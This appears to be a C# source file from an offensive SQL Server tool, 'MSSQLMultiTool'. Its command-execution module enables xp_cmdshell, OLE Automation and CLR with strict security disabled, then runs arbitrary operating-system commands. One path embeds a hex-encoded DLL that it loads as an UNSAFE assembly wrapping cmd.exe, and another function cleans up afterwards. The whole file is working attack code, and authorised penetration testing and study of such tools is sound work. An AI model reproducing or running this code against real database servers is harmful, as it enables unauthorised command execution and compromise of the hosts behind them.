using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using MSSQLMultiTool.outputsLib;

namespace MSSQLMultiTool.Modules
{
    class commandExecution
    {
        static void checkArguments(Dictionary<string, string> arguments)
        {
            try
            {
                if (!arguments.ContainsKey("command"))
                {
                    outputs.printError("Missing Command Argument \n");
                    help();
                    Environment.Exit(0);
                }
            }
            catch (Exception e)
            {
                outputs.printError("Missing Command Argument \n");
                help();
                Environment.Exit(0);
            }
        }
        public static void help()
        {
            Console.WriteLine("--module execution\n");
            Console.WriteLine("     Arguments:\n");
            Console.WriteLine("     --instance <SQL Instance to execute commands on>\n");
            Console.WriteLine("     --run <sub module to run>\n");
            Console.WriteLine("         Sub Modules:\n");
            Console.WriteLine("         xp_cmdshell       : Executes XP_CMDSHELL\n");
            Console.WriteLine("         sp_OACreate       : Executes  OpenQuery Command\n");
            Console.WriteLine("         custom_assembly   : Executes  CustomAssembly Command\n");
            Console.WriteLine("         clean_custom_assembly   : Executes  CustomAssembly Command\n");
            Console.WriteLine("     --command    : CMD Command to Execute\n");
        }

        public static String execute_xp_cmdshell(SqlConnection con, String cmd)
        {
            String res = SQLModule.executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
            outputs.printOutput("Enabled 'xp_cmdshell'.");
            res = SQLModule.executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
            outputs.printSuccess($"Executed command! Result: {res}");
            return res;
        }

        public static String execute_sp_OACreate(SqlConnection con, String cmd)
        {
            String res = SQLModule.executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
            outputs.printOutput("Enabled OLE automation procedures.");
            res = SQLModule.executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
            outputs.printSuccess($"Executed command!");
            return res;
        }

        public static String execute_customAssembly(SqlConnection con, String cmd)
        {
            String assemblyHex = "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200B5CE71C80000000000000000F00022200B023000000C000000060000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000040400000000000000000000000000000000000000000000000000002C2A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000F50A000000200000000C000000020000000000000000000000000000200000602E72737263000000040400000040000000060000000E0000000000000000000000000000400000400000000000000000000000000000000000000000000000000000000000000000000000000000000048000000020005001421000018090000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300001804000023537472696E6773000000003C070000580000002355530094070000100000002347554944000000A40700007401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010000000300000000007B020100000000000600A50139030600120239030600C30007030F00590300000600EB009D02060088019D02060069019D020600F9019D020600C5019D020600DE019D02060018019D020600D7001A030600B5001A0306004C019D020600330144020600AB0396020A000201E6020A005E0268030E008E0307030A007900E6020E00BD0207030600740296020A003700E6020A00A5002B000A00FD03E6020A009D00E6020600CE0221000600DB0221000000000001000000000001000100010010007D03000041000100010048200000000096004C00620001000921000000008618010306000200000001006D00090001030100110001030600190001030A002900010310003100010310003900010310004100010310004900010310005100010310005900010310006100010315006900010310007100010310007900010310008900010306009900010306009900AF022100A90087001000B100A4032600A90096031000A90030021500A900E20315009900C9032C00B90001033000A10001033800C90094003F00D100BE0344009900CF034A00E10054004F00810068024F00A10071025300D10008044400D1005E0006009900B20306009900AF00060081000103060020007B006C012E000B0068002E00130071002E001B0090002E00230099002E002B00B5002E003300B5002E003B00BB002E00430099002E004B00C8002E005300B5002E005B00B5002E006300E7002E006B0011012E0073001E011A000480000001000000000000000000000000000A000000040000000000000000000000590043000000000004000000000000000000000059002B000000000004000000000000000000000059009602000000000000003C4D6F64756C653E004D5353514C437573746F6D417373656D626C79444C4C0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E67004D5353514C437573746F6D417373656D626C79444C4C2E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F770000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000C065CFB09BDE3146BA00AE880FF2A3D100042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001B0100164D5353514C437573746F6D417373656D626C79444C4C00000501000000000C010007485020496E632E00001E010019436F7079726967687420C2A920485020496E632E203230323100002901002431323232346563372D393935372D343330382D613031332D30356533613436663936643700000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32040100000000000000000000A50DCA9A000000000200000091000000642A0000640C00000000000000000000000000001000000000000000000000000000000052534453B7520D7AF69A7847A3E17E4D9EC4FA4E01000000433A5C55736572735C6C6F63616C74656D705C736F757263655C7265706F735C4D5353514C437573746F6D417373656D626C79444C4C5C4D5353514C437573746F6D417373656D626C79444C4C5C6F626A5C7836345C52656C656173655C4D5353514C437573746F6D417373656D626C79444C4C2E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000A80300000000000000000000A80334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B00408030000010053007400720069006E006700460069006C00650049006E0066006F000000E402000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000030000800010043006F006D00700061006E0079004E0061006D0065000000000048005000200049006E0063002E000000560017000100460069006C0065004400650073006300720069007000740069006F006E00000000004D005300530051004C0043007500730074006F006D0041007300730065006D0062006C00790044004C004C0000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000056001B00010049006E007400650072006E0061006C004E0061006D00650000004D005300530051004C0043007500730074006F006D0041007300730065006D0062006C00790044004C004C002E0064006C006C00000000005600190001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A900200048005000200049006E0063002E0020003200300032003100000000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005E001B0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004D005300530051004C0043007500730074006F006D0041007300730065006D0062006C00790044004C004C002E0064006C006C00000000004E0017000100500072006F0064007500630074004E0061006D006500000000004D005300530051004C0043007500730074006F006D0041007300730065006D0062006C00790044004C004C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            String res = SQLModule.executeQuery("EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE", con);
            outputs.printOutput("Enabled Options");
            res = SQLModule.executeQuery($"CREATE ASSEMBLY myAssembly FROM {assemblyHex} WITH PERMISSION_SET = UNSAFE;", con);
            outputs.printOutput("Loaded Assembly");
            res = SQLModule.executeQuery("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];", con);
            res = SQLModule.executeQuery($"EXEC cmdExec '{cmd}'", con);
            outputs.printSuccess($"Executed {cmd} successfuly");
            return res;
        }

        public static String clean_custom_assembly(SqlConnection con)
        {
            String res = SQLModule.executeQuery("DROP PROCEDURE cmdExec; DROP ASSEMBLY myAssembly", con);
            outputs.printSuccess("Cleaned Assembly");
            return res;
        }
        static void ExecuteSubModule(Dictionary<string, string> arguments, SqlConnection con)
        {
            try
            {
                if (arguments["run"].Equals("xp_cmdshell"))
                {
                    try
                    {
                        execute_xp_cmdshell(con, arguments["command"]);
                    }
                    catch(Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }
                else if (arguments["run"].Equals("sp_OACreate"))
                {
                    try
                    {
                        execute_sp_OACreate(con, arguments["command"]);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }

                else if (arguments["run"].Equals("custom_assembly"))
                {
                    try
                    {
                        execute_customAssembly(con, arguments["command"]);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }

                else if (arguments["run"].Equals("clean_custom_assembly"))
                {
                    try
                    {
                        clean_custom_assembly(con);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }


            }
            catch(Exception e)
            {
                outputs.printError(e.Message);
                Environment.Exit(0);
            }
        }
        public static void run(Dictionary<string, string> arguments, SqlConnection con)
        {
            outputs.printHeader("Loading Command Execution Module");

            checkArguments(arguments);

            ExecuteSubModule(arguments, con);
        }
    }
}
